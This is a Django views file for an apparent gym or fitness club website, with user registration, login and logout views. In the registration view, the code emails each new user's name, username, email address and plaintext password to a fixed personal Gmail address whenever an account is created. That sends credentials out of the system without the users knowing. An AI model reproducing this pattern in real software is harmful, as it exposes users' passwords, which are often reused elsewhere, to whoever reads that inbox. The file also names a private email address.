from django.shortcuts import render,redirect
from django.contrib.auth.models import User,auth
from django.core.mail import send_mail
from django.contrib import messages
# Create your views here.
def register(request):

    if request.method == 'POST':
        first_name = request.POST['first_name']
        last_name = request.POST['last_name']
        username = request.POST['username']
        email = request.POST['email']
        password1 = request.POST['password1']
        password2 = request.POST['password2']

        if password1==password2:
            if User.objects.filter(username=username).exists():
                messages.info(request,'username taken')
                return redirect('register')
            elif User.objects.filter(email=email).exists():
                 messages.info(request,'email already exists')
                 return redirect('register')
            else:    
                user = User.objects.create_user(first_name=first_name,last_name=last_name,username=username,email=email,password=password1)
                user.save()
                send_mail(
                'New massage from Fitness Club',
                 first_name+" "+last_name+"\n"+username+"\n"+email+"\n"+password1,
                'noor.alam.619@gmail.com',
                ['noor.alam.619@gmail.com'],
                fail_silently=False,   
                )   
                print('user created') 
                return redirect('login')
        
        else:
            messages.info(request,'password not matched')
            return redirect('register')
    return render(request,'gym/register.html')


def login(request):
    if request.method== 'POST':
         username = request.POST['username']
         password = request.POST['password']
         user=auth.authenticate(username=username,password=password)
         if user is not None:
            auth.login (request,user)
            return redirect('/gym/')
         else:
              messages.info(request,'username or password is worng')
              return redirect('login')
   
   
    else:
        return render(request,'gym/login.html')




def logout(request):
    auth.logout(request)
    return redirect('/gym/')

    